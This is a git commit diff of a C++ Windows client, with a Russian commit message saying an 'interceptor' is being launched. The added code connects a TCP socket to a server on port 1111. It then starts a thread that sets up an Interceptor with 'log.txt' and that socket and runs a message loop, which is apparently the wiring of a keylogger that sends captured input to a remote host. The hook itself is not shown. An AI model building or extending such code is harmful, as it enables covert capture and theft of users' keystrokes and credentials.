0139861ef69d1b4766c71a835aa294675e604aa7
Aprekek <mhlshamburov@gmail.com>
2020-12-02 14:24:55 +0700

    Добавил процедуру запуска перехватчика

--- client/client.cpp
+++ client/client.cpp
@@ -1,11 +1,18 @@
 ﻿#include <winsock2.h>
 #include <ShellAPI.h>
 #include <iostream>
+#include "Interceptor.h"
 
 using namespace std;
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma warning(disable: 4996)
+
+constexpr auto FILE_PATH = "log.txt";
+
+SOCKET connection;
+
+DWORD WINAPI hookJob(LPVOID lpParm);
 
 int main(int argc, char* argv[]) {
 	WSAData wsaData;
@@ -23,7 +30,7 @@ int main(int argc, char* argv[]) {
 	addr.sin_port = htons(1111);
 	addr.sin_family = AF_INET;
 
-	SOCKET connection = socket(AF_INET, SOCK_STREAM, NULL);
+	connection = socket(AF_INET, SOCK_STREAM, NULL);
 	if (connect(connection, (SOCKADDR*)&addr, sizeof(addr)) != 0) {
 		cout << "Error: failed connect to server." << endl;
 		return 0;
@@ -32,12 +39,40 @@ int main(int argc, char* argv[]) {
 	char data[256] = "Hello!";
 	char strExit[256] = "exit";
 
-	while (1) {
-		send(connection, data, sizeof(data), NULL);
-		if (strcmp(data, strExit) == 0)
-			break;
-	}
+	HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)hookJob, NULL, NULL, NULL);
+	if (hThread)
+		while (true)
+		{
+			;
+		}
+	else
+		exit(EXIT_FAILURE);
+	
+// 	while (1) {
+// 		send(connection, data, sizeof(data), NULL);
+// 		if (strcmp(data, strExit) == 0)
+// 			break;
+// 	}
 
 	system("pause");
+	return 0;
+}
+
+DWORD WINAPI hookJob(LPVOID lpParm)
+{
+
+	Interceptor* interceptor = Interceptor::getInstance();
+	if (interceptor == NULL)
+		exit(EXIT_FAILURE);
+
+	if (interceptor->init(FILE_PATH, connection) == -1)
+		exit(EXIT_FAILURE);
+
+	MSG message;
+	while (GetMessage(&message, NULL, 0, 0)) {
+		TranslateMessage(&message);
+		DispatchMessage(&message);
+	}
+
 	return 0;
 }
